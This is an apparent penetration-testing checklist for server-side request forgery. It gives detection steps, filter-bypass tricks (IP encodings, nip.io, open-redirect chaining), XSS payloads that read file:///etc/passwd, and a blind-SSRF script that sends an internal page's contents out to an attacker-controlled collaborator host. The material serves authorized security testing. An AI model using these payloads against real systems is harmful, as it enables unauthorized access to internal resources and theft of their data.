# Server-Side Request Forgery (SSRF)

An SSRF vulnerability allows an attacker to make requests originating from the web server

## Checks

- [ ] Look for anything that takes a URL input or fetches a resource (e.g., screenshot utility, pdf generator, etc.)
- [ ] If 127.0.0.1 or localhost aren't working, try variations to see if poor filtering rules are being used
    - Also make note of any internal IP addresses disclosed throughout the application. Try those to see if you can access resources on those hosts.
- [ ] Check to see if the server can communicate with any other servers on the internal network
- [ ] Try to get an external interaction to a server we control. Collaborator, interactsh, etc.

- [ ] Try other URI schemes, `file://`, etc.
- [ ] Try looking for common images like `favicon.ico`
    - Check the location of the image on the server

!!! tip "Make sure the request is coming from the server and not your browser before reporting."

## Bypasses

|**Mitigation**|**Bypass**|
|---|---|
|Whitelisting|Look for an open redirect|
|Blacklisting|Create a custom CNAME and point it to the internal IP address of the target<br><br>Check for poor regex handling|
|Restricted content-types, characters, or extensions|Fuzzing or finding a bypass (encoding, other)|
|No response|JavaScript XHR request|

### Bypassing blacklists

- [ ] Try different ways of entering IP addresses. e.g., 127.1 instead of 127.0.0.1
    - Also try different encodings
- [ ] Point a custom subdomain to 127.0.0.1 and use that
    - localhost.tomfieber.dev -> 127.0.0.1
- [ ] Use [nip.io](http://nip.io/)
    - [127.0.0.1.nip.io](http://127.0.0.1.nip.io/) -> 127.0.0.1

### Bypassing whitelists

- [ ] Try to figure out how the filter is working
    - Can we append a domain we own? e.g., `victim.com.hacker.com`
    - Or `hackervictim.com`
    - etc.
- [ ] Chaining an open redirect
    - If we can find an open redirect in another part of the application, we can use **THAT** URL with the SSRF to redirect to our desired site. `https://teal.ctfio.com/?redirect=https://YOUR-OAST-PAYLOAD`
- [ ] Chaining HTML injection/XSS
	 
	 Try something like 
	 ```text title="document.write"
	 <script>document.write(document.location)</script>
	 ```
	 
	```text title="window.location"
	<script>window.location="file:///etc/passwd"</script.
	```

### Blind SSRF

Example exploit script

```jsx
<script>
    exfil = new XMLHttpRequest();
    // Set the correct server below e.g <https://abcdefg.ctfio.com>
    exfil.open("GET","{server}/blind/recipe");
    exfil.send();
    // put your colab instance below to you can capture the contents of /blind/recipe
    exfil.onload = function(){ document.write('<img src="{colab_instance}}/?x=' + btoa(this.responseText) + '">'); }
</script>

```
